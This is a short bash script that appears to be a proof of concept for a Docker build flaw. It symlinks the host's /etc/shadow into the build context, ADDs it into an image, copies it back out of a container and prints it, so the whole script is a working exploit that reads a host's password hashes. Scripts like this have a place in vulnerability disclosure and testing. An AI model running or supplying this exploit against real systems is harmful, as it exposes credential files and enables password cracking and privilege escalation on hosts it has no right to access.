#!/bin/bash

cat > Dockerfile << "EOF"
FROM ubuntu
ADD ./files/shadow /tmp/shadow
EOF

mkdir -p files
ln -s /etc/shadow files/shadow

docker build -t ibuildthecloud/hack .
C=$(docker run -t -i -d ibuildthecloud/hack sleep 1)
docker cp ${C}:/tmp/shadow .

echo "Your shadow file"
cat shadow

rm -rf shadow files Dockerfile
